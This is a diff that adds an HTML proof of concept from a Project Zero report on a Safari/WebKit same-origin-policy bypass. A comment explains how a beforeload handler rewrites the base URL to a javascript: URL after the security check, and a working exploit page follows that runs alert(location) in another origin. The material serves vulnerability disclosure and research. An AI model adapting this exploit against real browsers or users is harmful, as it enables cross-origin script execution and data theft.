@@ -1,0 +1,87 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1120
+
+When an object element loads a JavaScript URL(e.g., javascript:alert(1)), it checks whether it violate the Same Origin Policy or not.
+
+Here's some snippets of the logic.
+
+void HTMLObjectElement::updateWidget(CreatePlugins createPlugins)
+{
+    ...
+    String url = this->url(); 
+    ...
+    if (!allowedToLoadFrameURL(url))
+        return;
+    ...
+
+    bool beforeLoadAllowedLoad = guardedDispatchBeforeLoadEvent(url);
+    ...
+
+    bool success = beforeLoadAllowedLoad && hasValidClassId();
+    if (success)
+        success = requestObject(url, serviceType, paramNames, paramValues);
+    ...
+}
+
+bool HTMLPlugInImageElement::allowedToLoadFrameURL(const String& url)
+{
+    URL completeURL = document().completeURL(url);
+    if (contentFrame() && protocolIsJavaScript(completeURL) && !document().securityOrigin().canAccess(contentDocument()->securityOrigin()))
+        return false;
+    return document().frame()->isURLAllowed(completeURL);
+}
+
+bool HTMLPlugInElement::requestObject(const String& url, const String& mimeType, const Vector<String>& paramNames, const Vector<String>& paramValues)
+{
+    if (m_pluginReplacement)
+        return true;
+
+    URL completedURL;
+    if (!url.isEmpty())
+        completedURL = document().completeURL(url);
+
+    ReplacementPlugin* replacement = pluginReplacementForType(completedURL, mimeType);
+    if (!replacement || !replacement->isEnabledBySettings(document().settings()))
+        return false;
+
+    LOG(Plugins, "%p - Found plug-in replacement for %s.", this, completedURL.string().utf8().data());
+
+    m_pluginReplacement = replacement->create(*this, paramNames, paramValues);
+    setDisplayState(PreparingPluginReplacement);
+    return true;
+}
+
+The SOP violation check is made in the method HTMLPlugInImageElement::allowedToLoadFrameURL.
+
+What I noticed is that there are two uses of |document().completeURL| for the same URL, and the method guardedDispatchBeforeLoadEvent dispatches a beforeloadevent that may execute JavaScript code after the SOP violation check. So if the base URL is changed like "javascript:///%0aalert(location);//" in the event handler, a navigation to the JavaScript URL will be made successfully.
+
+Tested on Safari 10.0.3(12602.4.8).
+
+PoC:
+-->
+
+<html>
+<head>
+</head>
+<body>
+<script>
+
+let o = document.body.appendChild(document.createElement('object'));
+o.onload = () => {
+    o.onload = null;
+
+    o.onbeforeload = () => {
+        o.onbeforeload = null;
+
+        let b = document.head.appendChild(document.createElement('base'));
+        b.href = 'javascript:///%0aalert(location);//';
+    };
+    o.data = 'xxxxx';
+};
+
+o.type = 'text/html';
+o.data = 'https://abc.xyz/';
+
+</script>
+</body>
+</html>
